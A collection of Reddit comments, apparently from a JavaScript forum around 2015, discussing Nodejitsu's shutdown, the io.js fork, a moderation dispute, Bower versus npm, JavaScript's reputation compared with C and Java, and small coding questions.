I am so sorry for all the employees and customers of nodejitsu.
There's this- https://developer.mozilla.org/en/demos/detail/bananabread I think the high graphics and frame rate needed to make a decent FPS mean the browser is hard choice though
I'm hoping for a similar resolution as the (now, I guess, ancient) GCC/EGCS split. The solution there was to declare the fork (egcs) as the new official version of the project and basically forget the old one ever existed. Unfortunately, that's something that will need to happen soon. If node.js simply continued to languish it wouldn't be a big deal, but if they really step up commits and take things in a different direction that would be a hard task.
that's exactly why I don't use ember. My work flow is as followed : droping a js file in an html file,period. If i need to compile stuff before I can open an html file in a browser then the framework IS NOT for me. That's exactly why I liked angular at first place.I could keep my jquery plugins ,just wrap them into a directive and code on the fly,without a server or an asset pipeline. That's also why I wont even touch React and JSX. &gt; this is more or less the norm for 'ambitious' frameworks. Angular 1.x is an ambitious framework. Anything that requires a compilation step is not a pragmatic framework.
In addition to Bootstrap, also check out Foundation: http://foundation.zurb.com/ It's not as popular as Bootstrap, but I feel it has a more enterprise look to it that may be more appropriate depending on your situation. The downside is because it is not as popular there are fewer widgets. In the past, support has been available by simply pinging the people who work for Zurb via something like twitter, but they recently moved to a paid support model so I'm not sure if that free avenue is available anymore. It may be better to find a more fitting skin for Bootstrap that is easy to apply, but unfortunately I haven't had time to learn about that (though I would love to).
Reading material: https://www.joyent.com/blog/the-power-of-a-pronoun https://github.com/joyent/libuv/pull/1015#issuecomment-29568172 Also note that Ben has contributed like 35% of the libuv code.
Code style checkers are great, but are no means a magic bullet and in fact just seems to be an annoying barrier to getting code checked in - getting forced to having to adhere to someone else's coding style. The only functional aspect I can see for the use of a code style checker is to assist GZIP and prevent the occasional bug. the JIT compilers seem to throw just about everything optional away, so please don't confuse code style with performance.
Hi /u/ieatgoldfish, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index). &gt; * If you'd like to show off your latest project, then that's great! We love seeing what fellow redditors can come up with. However, the same posting rules apply: it must relate to JavaScript. For example, this could be a link to the project page (unminified/unobfuscated source code), or maybe an overview of your architectural decisions, a code review request, etc.; you can even do so in the comments if the site itself doesn't meet the posting criteria. NOTE: The fact that a site was made with JavaScript does not automatically make it eligible to be posted to /r/javascript, including games. If we allow any site that uses JS to be posted to /r/javascript, then we'd soon be indistinguishable from /r/WebGames, /r/InternetIsBeautiful, etc. Instead, we aim to foster discussions around the source code, and/or the development processes and practices used to create the project.
&gt; I will end this section by adding something that’s not really the fault of CSS but definitely makes web development faulty, and that’s the inconsistency between browsers. This issue is so disgusting and explicit that there’s simply nothing else to add. Well yeah, that's not really the fault of CSS. As the browser converts the markup into the DOM you could actually go even further and say that the DOM itself is fundmentally flawed. DOM extensions and the way DOM objects are interpreted have always been a problem. Which is unavoidable for something which started out un-standardized. One alternative to the whole mess of DOM extension is object wrappers. That's the approach jQuery has taken from the start. The idea is instead of extending elements or events directly, create a wrapper around them, and delegate methods accordingly. But again its another "fix / patch". So replacing the DOM with bytecode would actually be a sensible idea. I'm having trouble though seeing how one language could manage everything. Even Android will use Java for logic and XML for presentation. So I can see two rather than one language being your ultimate goal. But again I'm just assuming that. I could be (and willing to find out why I am) totally wrong.
Thanks, I got it working, upvotes!!!!
What's your opinion on TypeScript?
I think that [tern](http://ternjs.net/) can do everything that ctags can. Sure, it will be slower, but unless you are using a very old pc, that won't be a problem.
Any language that has an interpreter/runtime for that platform can be run anywhere. Java and C# can be run on the front end and the backend as long as the run-time environments are installed.
Could you please keep it down, we're trying to have a circle jerk over here. /s In all seriousness, good writeup on what you're up to and using.
I think you want to look into transpilers. For instance, check out CoffeeScript or SeriousJS. Essentially, you are writing a compiler, but rather than outputting assembly, your compiler outputs javascript. The principles are the same as any other compiler though. 
The post will not be reinstated, because as it stands, it has absolutely zero relevance to the sub. Thanks.
"I figured I'd post here to see how other people might build / want to build something similar." Interesting. So no fostering cross discussions how to tackle issues.
&gt; For example, this could be a link to the project page (unminified/unobfuscated source code), or maybe **an overview of your architectural decisions**, a code review request, etc.; and &gt; we aim to foster discussions around the source code, **and/or the development processes and practices used to create the project**. I fail to see the issue.
You didn't bring anything of substance, you just spit-balled an idea into a couple of sentences. To be honest, this looks _a lot_ like a homework assignment (some vague requirements with a "so how would you do this?"). I'm not saying it is actually homework, but the level of effort that you've put forth thus far is minimal, to say the least. Look, I'm not against you (or your idea), but could you flesh it out a little more and post again? You haven't demonstrated that you've even attempted to start writing it (which is not unusual or required to post), although you also haven't demonstrated that you've investigated any frameworks or libs, nor have you looked at any existing FOSS solutions, etc. You also haven't asked any pointed questions, i.e. "Should I base this off jQuery, or a full framework, or maybe a collection of microlibs?"
Not a homework assignment - I wish I was still in school, but alas it has been 15 years since. I think the post is being accepted as is, and to be frank, I think what the community decides as a fair post should trump mods. Or at least, in any healthy community, the community knows best. Via the post, and obviously from the people who have responded, the overall walkway was discussion about the topic. It's javascript related, it's meant (as stated) fun to tinker with. With many of us working as developers in our day to day, sometimes it's nice to break the monotony and think about something completely different. Again, the project has a purpose, it had me thinking about a JS solution, and to one that I've been working on. Again, it's aimed for fostering discussions, what people would to do tackle it, etc. If you're mentioning "you haven't mentioned investigating frameworks or libs" you need to update your guidelines to include this, you can't simply come out in a one case scenario and shoot this at someone. I'll let you restructure that, and I say the same for the "you haven't asked any pointed questions". Again, I'd say put this in your guidelines. Two people responded, many upvoted, it was being accepted and you pulled it. That's all I'm saying.
More like NoDaddy. 
With all the ethically questionable practices of GoDaddy, I don't feel the negative feedback is unwarranted. 
Had been one since its infancy, this hurt my team and I big time. C'est la vie
Also from the guidelines: &gt; Keep in mind that these are only guidelines, and we retain discretion as to how they will be applied. The guidelines are by no means exhaustive; we can't stipulate every little nuance, and they have to remain short enough that we can reasonably expect people to read and be familiar with them, and making them 10,000 words long is counter-productive to that goal. I think the crux of the problem with your post, is that it's just an idea. There isn't even a direct relationship with JS (since you could easily code this in practically any other programming language), and you haven't demonstrated that you've spent more than 3 minutes thinking about it. So basically, you're saying, _"I want to do X, how do I do it?"_ We'd like to encourage you to demonstrate that you've actually thought about the problem (and solution) beyond just the idea; otherwise, what's to stop someone from posting _"Hey I want to make a Facebook-killer, tell me how to do it!"_ Clearly we disagree, but since you've responded cordially and laid out reasonable arguments, I'll reinstate the post. However, please try to understand where I'm coming from, and apply what I've said to any future posts here. Thanks!
JSON is a data format. It maps very well to data structures in a lot of programming languages. JavaScript is not special in that regard. 
That's all alright, thanks for your reply. Just to make it clear, a big part of Tabris.js code is open-sourced and living on GitHub. And it's already welcomed some great contributions, including a full-fledged cloud editor, which makes your code instantly available on your iOS or Android device to test before build time. Now that, for me, is pretty exciting - so much so that I find it hard NOT to talk about it. But of course I respect your decision to wait! ;)
I like it a lot. It hits a sweet spot in between the typing in Python/JS and the other end of the spectrum like Java. I'm using it in a commercial team context mostly where there is a lot of code which needs to be navigated and understood by different people over periods of years. Being able to document types used and have tools do useful things with it (i.e. compile time checking, tracing program flow in an IDE) is a huge win. 
Just shows how much the original ideas within React were powerful. Sad I can't access React Native yet. Boohoohoo :-(
As an example, you might do the following: var HOT = 10; function MyMethod(instructions) { this.instructions = instructions; this.usage = 0; } MyMethod.prototype.run = function (ctx) { if (++this.usage &gt; HOT) { this.run = new Function( 'ctx', this.instructions .map(function (x) { return x.jit(); }) .join('') ); return this.run(ctx); } for (var i = 0; i &lt; this.instructions.length; i++) { this.instructions[i].run(ctx); } } This would allow the code to run interpreted until the code gets 'HOT' at which time we would compile to JS and then replace the method so we dispatch straight to the new JS function. At some time, the JS runtime would then possibly JIT our JS function, making it even faster.
they backpedaled at the last minute after a massive boycott was initiated
RIP Nodejitsu. My condolences to the Nodejitsu team and community for their loss.
Hi there, this article supports my reasoning for my comment. http://readwrite.com/2015/02/03/joyent-nodejs-incubator-iojs-node-io-fork 
no problem!
If you are indeed talking about Java and not JS, start by learning about loops, variables, arithmetic operators and about these two methods: - https://docs.oracle.com/javase/7/docs/api/java/lang/String.html#split%28java.lang.String%29 - https://docs.oracle.com/javase/7/docs/api/java/lang/String.html#length%28%29 That should be all you need for this.
What do you charge for refactoring javascript? Some guy spent a career writing spaghetti code throughout our inherited codebase that we need fixed...
RIP Nodejitsu. As a former customer, this is very disappointing. I always liked their service, despite the downtime.
I've had a similar idea, particularly regarding reading a ROM and converting it wholesale into a .js file. It's definitely possible, you just need to be able to translate the instructions to JavaScript one way or another. You could build your own code by concatenating strings, but it may very likely be cleaner to build an AST and use something like `escodegen`. The translation may be quite complicated, especially given JavaScript's lack of `goto`.
For meanLength(), iterate over every word and count the number characters. Add the number of characters to a global variable and also keep a counter that you increase once for every word. At the end it's just totalCharacters / wordsCount. Also note that average ≠ mean.
Forgive me, but didn't Knockout effectively implement this four years ago?
How so?
Nevermind, was on the mobile and misread it. 
Just remove it - this argument already ruined the thread. I just implore you to have better judgement next time is all. Thanks! **edit** Next time use PMs instead of the thread when you notify people you remove their thread. 
Woah there. First, I wasn't comparing node to java. I was comparing JavaScript to Java. &gt; lets be honest, only reason node.js is getting popular is because its new and we like new things (ruby on rails) that then die when its not new anymore. Node and ruby on rails aren't new. Node came out in 2009, RoR came out a decade ago. Basing the newness of framework, runtime, or language on it's popularity would mean Shell scripts must also be new, and they've been around since the 70's! &gt; are you trying to tell me node isnt flawed Nope. Node and io.js are open about their flaws. Hence why we have forks, issues, and pull request. &gt; and you cant do in java what you can in node? Actually, I'm not sure this means. Well, yeah there are things Java can't do which JavaScript can. For instance, modular JavaScript program can be composed completely by Linking Objects to Other Objects. In that case, JavaScript is actually more object-oriented than Java, which requires Classes and has a high necessity on Interfaces. In JavaScript you can get the good parts of interfaces by writing unit test. Also, Java doesn't have prototypal inheritance, JavaScript does. &gt; How is it losing its place? It's losing it's place as being the language of interoperability. It's possible to write a program in JavaScript and get it to run on a wider range of machines and devices than a program in Java could. &gt; when it comes down to real server side programming for performance/optimization you have to use a staticky typed compiled language. Nothing special about a single threaded async language. Any programmer that have a clue what their doing will tell you, you can program asynchronously in Java/C# but with more threads to work with. Oh? Again I was never comparing node to java, and I'm not sure what the basing of the "real-ness" of a server side program is. Node/io.js works fine on a single thread. Performance optimizations can be made in every part of a tech stack.
Will you transition to different hosting?
If another post like this appears, I will remove it without hesitation. I implore _you_ to try and fit into the community with which you're trying to connect, instead of trying to force the community to bend to your will. We keep communications public for transparency reasons; if you don't like that, then you have the freedom to find a different subreddit to post in. Thanks!
[Kotlin](http://kotlinlang.org)
this is a few lines of code I could've save in a previous project :P https://github.com/godaddy/node-redirect-rules 
The deobfuscated code that /u/_Nanobyte posted shows a windows specific downloader. Any netsec folks able to confirm? No harm in running chkrootkit or rkhunter.
Dude! I had fun with this! The aesthetics are cool and the functionality is fun. Good work!! 
definitely well made.
oh I didn't do it :P I found it on #PCMR
Oh... well, it's cool!
This is pretty spectacular.
JavaScript is to JSON as Clojure is to edn. https://github.com/edn-format/edn
This is actually a really interesting thought, what I thought was full stack js is actually fill stack c with a thin JavaScript layer on top. 
True that. But can you give me an example of storing the same language in a dB? I was wondering about java, the only thing I could think about was serializing the objects and perhaps storing in a redis dB, but that doesn't make much sense since you couldn't query the data. But languages like ruby and python have a object literal similar to json and could perhaps be stored in a dB?
I definitely agree with you. Runtime type checking is just trading undefined exceptions (null reference mostly) for more verbose exceptions generated through assertions. It's an improvement, sure, but the things Flow and TypeScript are doing statically are more helpful in the long run. Both in terms of maintaining large projects and preventing errors in deployed environments. Catching an exception while writing the code will always be better than catching it while running the code. Seems like they propose a static analyzer in the [Primer](https://docs.google.com/document/d/11YUzC-1d0V1-Q3V0fQ7KSit97HnZoKVygDxpWzEYW0U) but expect other people to write it. Having both static and runtime type analysis would be the best of both worlds.
This description sounds really spammy. Good thing you forgot to post a link!
thanks. I'm guessing this is the same reason why the CSS styles aren't being applied to the html elements that are dynamically created? it's for a homework assignment, i don't think i can use jquery yet because we haven't gotten to that part of the class yet. but thanks, i'm sure i'll be using this when we get to that section. Anyway, it all seems to work perfectly in google chrome. 
Have you tried using a debugger in Firefox like Dev Tools or Firebug to see what the problem is? 
saying its more object oriented because "Linking Objects to Other Objects" which is what prototypal inheritance btw...that means nothing. in fact classes are a good thing. hmm i guess thats why the coming JS es6 is getting classes and looking alot more like java? let me be clear, Theres nothing Javascript (not just node) does better then java on the server side...nothing.
You overwrite your whole body when using the writeln function on the document. If your script is located within your &lt;body&gt; instead of the &lt;head&gt; it will be overwritten and therefore not function anymore.
&gt; Hell, even Microsoft is open sourcing their work now. Node.js has always been under MIT; that's what made io.js possible. I'm not clear what that has to do with Microsoft.
Thought these were pretty good: https://medium.com/@erikdkennedy/7-rules-for-creating-gorgeous-ui-part-1-559d4e805cda
Its a bit of a tangent.. But its a sign of the times that a previously very private and business driven company like Microsoft is getting on board with open source. Even though node is open source it seems like Joyent is finding ways to close it under their control... To stifle its development in order to maintain their monopoly on its direction and corporate support contacts
You can't play the sound on the ; key on a Swedish keyboard. Also, the cuepoints in the samples are very off, making it impossible to play along in perfect sync :(
Do you mean `props` as in the `props` property in React? I dont really get the question. I could be of more help if you could elaborate a bit. Edit: Kinda get what you mean. Here's what I would do: I would use a graph data structure (be it in memory or a db like neo4j). The nodes would contain very specific data of a particular type (e.g., personal details, shared posts, visited restaurants, etc) and the edges would define relations (for e.g., personal details -&gt; visited restaurants will tell us who actually visited the restaurants or personal details -&gt; visited restaurants and personal details -&gt; shared posts will tell us what restaurants to people posting about "xyz" are likely to goto). This is the data part. When it comes to my views, I would create "lego block" components i.e., components that show some atom of data. Now, any time I need to draw any info on the screen, I would traverse the graph as required to get the data to display, and then pass it (in bulk) to some parent component which composes our "lego block" components. The smaller components would then just pick whatever data they need to render themselves.
I don't get it. The fact io.js exists is proof that Joyent can't keep it under their control; if control was what they were after, they could have changed the license years ago. Heck, all of Joyent's stack (node, SDC, Manta, SmartOS) is open source. They obviously take OSS seriously. It just seems that this criticism is unjustified.
Please elaborate on that.
John is technically correct, but in the end you're not touching that C++ code to get stuff done. Don't sweat about it. Otherwise, following his line of reasoning, the one true full stack language is machine code, since everything else runs atop.
Exactly. And if instead of "has been left" you'd written "has been closed" it would even make more sense ;)
I think the question is what you mean by *close*. One could think that the scope is no longer available or will be removed by the garbage collection although it still can be accessed by the closure. However, good point.
For my use case, I'm still struggling to switch back and forth between mongodb and postgres (with postgis). Most of these DB abstraction layers can't translate geospatial queries, so I end up manually appending $geoWithin or ST_Within operators depending on the context.
Admittedly I may have been unclear. Never meant to make is seem like OLOO and prototypal inheritance were seperate. My point was a java program can't be made simply by creating an object literal. For a language that's supposedly object-oriented... well that doesn't seem so OO to me. Yes classes are coming to es6. It doesn't mean everyone has to start using them. They are great if you've been using classical inheritance and want to continue using it in native JavaScript. As opposed to java, which as far as I know has no planned spec for prototypes. For server side stuff, it really depends on the context of "better" and how the program is written. Either language can get the same stuff done, I think its more personal preference of the developers. 
git, amirite?
That's quite possibly the most annoying site I've ever visited on my phone. The load time is atrocious, and the scrolling feels terrible. Don't fuck with my scroll, and for the love of God optimize your payload... It shouldn't take 5 seconds to load and render a plaintext article. Kind of ironic that an article about middleware/isomorphic js would be in such desperate need of implementing it
you can maybe use AJAX and get the code from http://wzrd.in 
This whole question is bizzare and ass-backwards. As the father says, until the 1990s we didn't have the web, and without the web a language couldn't *go* "viral" - there just wasn't anything like the breadth of community or speed of dissemination required. It's like asking whether ancient Egyptian astronauts used gold space-helmets - the correct answer is "your question doesn't even make sense - rethink your assumptions, or try to rephrase it in way that does". Edit: also, the father's answer is a bit suspect in places: &gt; By programming at a higher level of abstraction with C, there were entire classes of bugs in assembly that went away. For instance, using a ‘branch less than’ vs a ‘branch less than or equal’ vs ‘branch greater than’ vs Nope - that's a fencepost error, and we still have them even in modern languages these days (which, I suspect, is one reason everyone loves iterators so much). Also, anyone who criticises a language for being *too easy* is an unimaginably massive hipster tool. Languages are *supposed* to reduce the cognitive overhead to allow you to express your solutions as elegantly and effectively as possible. As long as it doesn't reduce flexibility (and sometimes even if it does - like Python with its [TOOWTDI](https://wiki.python.org/moin/TOOWTDI)), anyone who thinks a language making the programmer's life easier is a bad thing is a posing half-wit.
So... let me get this straight... To solve the performance issues on mobile, I use react-canvas so I can use a markup component (html) that you can set styling options for (css) and then manipulate (javascript). Why can't the DOM perform like canvas? I know the technical reasons, but why do those technical reasons exist? If websites require more performance, why not just supply a meta tag and hand the rendering of the DOM over to the hardware? All react-canvas (and others like it) are achieving is re-inventing the original stack, it seems pretty crazy to me. Don't get me wrong this is a great workaround for the current state of mobile browsers, but I suddenly realise how weird it is that the canvas element should be used for UI.
If it's not C/C++ it's not hardcore enough for them old farts. Or they just don't like their tech being innovated so much.
no, they are just going around in circles.
Javascript is the single most widespread and lowest-barrier-to-entry language in the world right now - every web browser runs it, and every desktop browser has developer tools built right into it for people to start playing with it. Low barrier-to-entry, however, means massively more people starting to play with it, and hence a lot of bad code written by a community with a distinct demographic bulge towards the bottom end of the skills spectrum (compared to - say - something like Haskell or Lisp). It's the same reason people generally view/viewed PHP devs as drooling halfwits, and VB developers before that. Add to that the fact that JS was designed and built in about ten days (and the syntax was required to be Java-esque for marketing reasons), and throw in a few other contentious design choices (like weak typing and automatic type-coercion) and it's an easy target for language snobs and people who mistakenly generalise from the ability of the average member of a community to the usefulness of the tool the community is based around (let alone from "personal preference in language design" to "objectively correct"). Plus in its early years people used to bitch a lot about "javascript" when they actually meant "browser implementation incompatibilities" or "the W3C DOM API", and there's the fact that the entire medium that JS is used to script (the web) being brand new and developing at a rapid pace for a decade or two. OSs, CLIs and embedded systems are fifty years old or more and pretty well-understood types of platform nowadays - the web was about five when the first version of JS came out, it's only about twenty five now, and we're still learning best practices and developing the platform at a pace that no traditional programming platform even comes close to. So basically you have a quickly put-together language with a low barrier-to-entry, powering a brand new platform paradigm for which best practices are even now still being developed, and a whole generation of (non-JS) developers who grew up looking down on javascript because of browser incompatibilities and a general lack of *already existing* best practices in the community.
if I'm writing some code in python and I have JSON data (stored in a file, a string buffer in memory, or a database) that I want converted into equivalent data structures in Python this is all I do deserialized_data = json.loads(some_json_data) if I have some data structured as Python lists and dictionaries and I want to store it as JSON this is all I do serialized_data = json.dumps(some_python_objects) 
[**@jscs_dev**](https://twitter.com/jscs_dev/) &gt; [2015-02-12 13:35:36 UTC](https://twitter.com/jscs_dev/status/565866815071723520) &gt; @varya_en JSCS, for long time now, has support for ES6, you can enable it with "esnext" option through config, CLI ---- ^This ^message ^was ^created ^by ^a ^bot [^[Contact ^creator]](http://www.reddit.com/message/compose/?to=jasie3k&amp;amp;subject=TweetsInCommentsBot)[^[Source ^code]](https://github.com/janpetryk/reddit-bot) 
I'm so tired of hearing the "developed in ten days" thing. Javascript has been in development for twenty years. It doesn't matter how long it took to scrape the first LiveScript release together because *we aren't using it anymore*.
&gt; doesn't matter how long it took to scrape the first LiveScript release together because we aren't using it anymore. That's not strictly true. You can't fix everything by adding features. There are lots of decisions made in those 10 days that are still with us. Adding features always adds complexity - e.g ["let" is probably a better design than "var"](http://es6rocks.com/2014/08/what-you-need-to-know-about-block-scope-let/) but "var" has to keep working the way that it used to. 
Yet those runtimes were still mostly abandoned
One of the saddest thing in the programmers community now that it is so globalized and so diverse is elitism and non-sense flaming. Good thing is, there's also a lot of practical people that don't see how crapping on one language or paradigm would be useful. You shouldn't worry.
Backwards compatibility is a thing, though, and one of the primary strengths of the web is the fact that precisely because it's a distributed systems it's supposed to be as backwards-compatible as possible. If you release a new version of a browser that adds functionality everyone's happy, but if you release a new version of a browser that *breaks existing working code* then people perceive it as a fault with your browser, your browser loses market share and your competitors win. By the time the HTML, CSS and especially JS was really standardised the first round of browser wars were over, and the web was already *massive*. At that point even if you tried to break backwards compatibility in the name of standards-compliance you'd break tens of thousands of sites for millions of users. This is primarily why it's taken IE so long to even approach standards-compliance *even since* Microsoft finally pledged to support web standards - because there were several whole generations of websites (and even more knotty, internal intranet web-apps) developed against IE's existing non-standard behaviour, and there was no real way to change that behaviour without breaking their customers' existing code. Instead the industry had to start relying on hitherto-obscure concepts like DOCTYPEs and forking their renderers into parallel "standards" and "quirks" modes, and basically just waiting until the majority of the old code had rotted away thanks to old age. You could perhaps try something similar with JS (similar to `"use strict";`), but it's not an easy problem to get all the players on the same page... so instead people have experimented with languages like CoffeeScript and TypeScript that compile to vanilla JS instead. So yeah... we could easily add *new* APIs and language features like "===" to work around problems, but if you want to start actually *fix* things by - for example - changing core assumptions like variable hoisting or the truthiness of empty arrays/strings - you're immediately in a world of hurt.
html5 != Javascript the api isn't the language. All in all js is style crap,though it's getting better.
I think C was bad, and Pascal was better than C. C is a half backed farce, C++ is even worse as it has to be backward compatible with C,but it doesn't matter. Devs already choose the language they use,the job dictates it.
OP can't tell the difference between being forced on everybody's computer via the browser and succeeding massively in the languages landscape. When C became popular there was virtually no coercion to use it. It was a compiled language like any other. It didn't have a particularly strong community and there was basically no code base to push it. On the other hand no language ever has inspired so many efforts to effectively avoid coding directly in it, and literature based on which parts of the language to avoid. They just cannot be compared. Now, Javascript is no doubt useful to know. You can code your stuff in JS and if you care about your practices your code can be fine. But the evolution of these languages simply cannot be compared. For historical reasons, Eich had to rush the whole design of Javascript basically from scratch in 10 days. Could have been much worse. Sometimes the market evolves in incredibly dirty ways like that.
Well put
Not sure about C but C++ was.
You figured it out. And reddit opens new pages when you click links. I still don't get the big deal. 
Back in the day Amon Tobin had a smiliar awesomeness (warning: flash) http://www.amontobin.com/supermodified/ Edit: click the 2nd unlabelled box once the page loads (supermodifier 1.0) And yes, thank god we've moved on from mystery meat navigation!
How do you define "*C features*"? You can use "*C features*" from C# as well.
i could basically replace the word 'javascript' with 'php' in all these comments and have a copy of a thread over in /r/php from three years ago.
&gt; Also, anyone who criticises a language for being too easy is an unimaginably massive hipster tool. Languages are supposed to reduce the cognitive overhead to allow you to express your solutions as elegantly and effectively as possible. I recall someone published an essay in the old days of the web making fun of this kind of mentality. Something about how *real* programmers don't use Lisp or C, they program with punch cards. 
HTML / JS is design by committee. It's always going to be slower and not as good as the best efforts of a single institution. So there is one reason it is a bit chaotic.
Precisely this. We used C because we liked it. Javascript is only popular because we're forced to use it in order to use the web. If the W3C/WHATWG were to introduce a proper bytecode VM standard for the web, I would spend every waking moment I had porting an actual decent language to the web and tell Javascript to piss off.. forever.
Obviously not. The internet wasn't the convenient forum it is now for griping. Also there were a lot fewer programmers back then... so not as many to complain.
I didn't realize a feature of a language was the same as the entire language. You can't compile arbitrary C code with cl or g++ either.
Node.js is a byproduct of the strong need to optimise js interpreters. Regardless, I would not recommend it for virtually anything facing the web. Its attack surface is massive and security practices atrocious. If not for the browser js would be dead and dusted.
&gt; This whole question is bizzare and ass-backwards. As the father says, until the 1990s we didn't have the web, and without the web a language couldn't go "viral" - there just wasn't anything like the breadth of community or speed of dissemination required. Uh huh. Fortunately, the father is able to get past that technicality and actually give interesting historical perspective, rather than writing off the whole question as meaningless and leaving it at that.
I take your point: computer "viruses" and "going viral" are very different things. However, the essay I cited does use "virality" in a memetic sense, e.g. "Once the virus has spread, there will be pressure to improve it" and the Wikipedia page you cited mentions word-of-mouth as a possible vector. My point is that the parent comment is wrong: it is possible to compare the rise in popularity of JS and C, and it makes sense to consider both of them as propagating through social networks. C very much "went viral" in the sense that it spread quickly through a social network. 
but you can compile C code in g++ the article you linked said exactly that, that's why it's called C++ and not D,stupid. And you what,i've better things to do than answering your lame points.
I like when people shit on JS. I don't understand this mindset that if people make uninformed or irrelevant criticism you must get upset about it. Who cares. But then, I enjoy being underestimated in general.
Yeah, exactly. I don't see the point of getting too sensitive about this. 
I didn't take on the rest of the message which was full of nonsense because I didn't want to get caught replying to stuff all night, so I will try to keep this short hoping I don't need to get caught with anything else. You can have a look at this: https://speakerdeck.com/ckarande/top-overlooked-security-threats-to-node-dot-js-web-applications There's also major language design problems like garbage collection not meant to be secure as it wasn't as needed on a language for the browser (you are not supposed to store passwords in js and the browser generally has its own sandbox facilities). Out of the languages typically used for web servers node.js has to have the biggest attack surface by far. It comes with everything and the kitchen sink by default and the default package management security policies are also soft as cheese. Note that the standards for web frameworks are rather poor, though, and I expect Node.js to patch stuff until it's not much worse than RoR. Still, currently I would never recommend it for anything requiring moderate security.
&gt; the idea of closure is to being able to access the parent's scope after it has been left. Actually, this is not true, although it is certainly part of what makes closures powerful. Lexical name resolution is what makes something a closure. The “accessing the value after the scope has been “left” is a consequence of lexical scope. The word “closure” came from the idea that all the names can be resolved statically, unlike the original “dynamic” scope in Lisp where free variables might or might not be resolved depending on what environments were in the stack when the function was called.
Being designed by a committee doesn't guarantee something it bad, but yes usually it does.
I'm just going to leave this here... https://www.gnu.org/fun/jokes/unix-hoax.html Also yes, I'm old, I know :( 
It forces you to keep your dependencies flat, which is generally considered favorable for the frontend. 
 Although NPM is branching out and you could probably do many of the same things - Bower is strictly for front-end package management and works well with github repos and task runners out of the box. IIRC NPM deals only with Javascript since its only (mainly?) used for the backend and thus doesn't pull in frameworky stuff you'd need for the front-end like Bower does (CSS files and images e.g.) My 2cents.
That presentation makes me laugh, as does your point. "Node.js is insecure! To protect against all these well known web vulnerabilities, you have to do incredibly complex things like... use these established modules that you can drop in and bind to." Compared to PHP this is heaven.
People said that before the internet when irony still worked.
For simple things this might be viable but re-implementing HTML inside &lt;canvas&gt; sounds stupid as shit. A good case study nonetheless.
Can you elaborate? 
Most of those are Express-related. That's like saying Java is insecure because some Java library is.
Style crap?
Some reason the semicolon didn't work for me :(.
They have the entire source with examples on Bitbucket: https://bitbucket.org/cleonello/jqplot/src/e8af8a37f0f14ea1e8c630ecfe6f1b1933794036/examples/?at=default
You're very welcome
Chock full of glutens moment is.
As /u/circusbred said, it uses AJAX. You can probably just use this request and change the product ID. It will return JSON $.post("/remote.php", {action:"add", w: "getProductAttributeDetails", product_id:166}, function(response) { console.log(response.details.image); });
1. I should have done my homework but what if your two dependencies require a different version of the same dependency? 2. I'm not sure why this is favorable for the front end, since what ultimately gets delivered is the single dependency. 
Fortunately that would never be an issue with npm. I should add that's assuming you're using something like browserify or webpack. 
You need to place that element inside &lt;body&gt;
Also, if it is just blank; look at your javascript console in the browser to see if any errors was thrown.
Like I said - NPM is branching out and/or catching up. What's your point?
Take up a shit-ton of disk space when it clones an entire Git repository just to figure out it only needs one, minified file.
`$ npm install bower -g` That line should tell you all you need to know.
wat 
The name of it is awful. Makes me wanna throw up awful.
"To install our package manager, first install a more powerful package manager."
I recently used it for a corporate web app, so in short size isn't too much of a problem. Performance could be though...
1. It depends how they are defined; if they can both be satisfied with the same version (e.g. 1.0.0 vs 1.0.1), then it just works. If it can't resolve it, you get a conflict; which you then need to specify what version to use in "resolutions". 2. Say you have a build script that concatenates and minifies all JavaScript; if you followed the npm model, you would need to recursively enter each `node_modules`'s `node_modules`, which might either duplicate or conflict with each other. Bower is also agnostic as to what is included, so you can easily use it for CSS and HTML as well.
I think Peer Dependencies address that somewhat: http://blog.nodejs.org/2013/02/07/peer-dependencies/
The [UNIX-Hater's Handbook](http://web.mit.edu/~simsong/www/ugh.pdf) (PDF warning) has quite a few jabs at C.
The main advantages of code-style checkers are to improve readability, and to prevent bikeshedding over aspects of the code that don't matter (e.g. tabs vs spaces). This frees you to think about what actually matters -- what the code does. JSCS won't catch bugs -- that is the role of JSHint. If you're gzip'ing you're running through a minifier first, so the performance/filesize has nothing to do with it. If a homogeneous coding style is a barrier to committing, then so be it. I would not trade developer convenience for code readability.
export overrides: https://github.com/yatskevich/grunt-bower-task#advanced-usage But seriously, this option should be part of the package itself, so bower knows only to pull certain files and add them to bower_components. It shouldn't be up to the user to determine this
Lots of people feel that peerDeps are an [anti-pattern](https://twitter.com/mikeal/status/450712360831836160). For frontend; usually bundlers like browserify/webpack will de-dupe modules for you. When two modules have conflicting major versions, you generally *don't* want them deduped as it can cause errors in your code. It's better just to have two copies of a module (like [xtend@1.x](https://github.com/Raynos/xtend/blob/d1250ddb0788a17a183a4a86830c512ff898bce5/index.js) and [xtend@4.x](https://github.com/Raynos/xtend/blob/94a95d76154103290533b2c55ffa0fe4be16bfef/immutable.js)) rather than dealing with "Version Hell."
[**@mikeal**](https://twitter.com/mikeal/) &gt; [2014-03-31 19:12:55 UTC](https://twitter.com/mikeal/status/450712360831836160) &gt; I think @domenic was the first person to suggest that the use case for peerDependencies might be an “anti-pattern.” I think it is. ---- ^This ^message ^was ^created ^by ^a ^bot [^[Contact ^creator]](http://www.reddit.com/message/compose/?to=jasie3k&amp;amp;subject=TweetsInCommentsBot)[^[Source ^code]](https://github.com/janpetryk/reddit-bot) 
It is kinda funny, listening to JS sycophants whining. Web development is pretty fucked in general, if you don't understand all the shortcomings, then you are part of the problem. We will use javascript (fuck the asshole who put java in the name) and a billion workarounds because that is the shit we have to work with. If you are happy about it, then you don't understand machines/computers in general, maybe politics would be better for you? edit or marketing?
I had a script in the head tag with functions to draw a table then load it with data using a different function. The body used onload to call the draw table function. When I moved the draw table function to a script inside the body and let that run on its own (without having to call a function) then everything seemed to work perfectly fine. Anyway thanks for the response, it seems like a good explanation as to why this happens!
Developers dislike bulky libraries regardless of needing to spit them over the network or not. If you are writing a pdf renderer, sure, 1MB makes sense. if you are parsing and formatting dates, maybe you have too much in your library if it ends up that large It is a sign of excessive surface area for security holes or bugs, excessive feature bloat means less time and sometimes thought is spent on the individual features, more complicated to understand apis and gotchas, more complicated init and documentation "I just want to do XYZ, why do I have to do all this crap!" screamed the developer, etc. Like any sign, it does not _mean_ anything either way, but it can be an indicator. Simple tools for simple jobs.
put all of your functions in a library type objet, like jquery does with $: _mylib.mytrunc(x) _mylib.someotherfunction(x,y)
I have no idea what any of you are talking about. And I'm a developer. This has caused me much fear. 
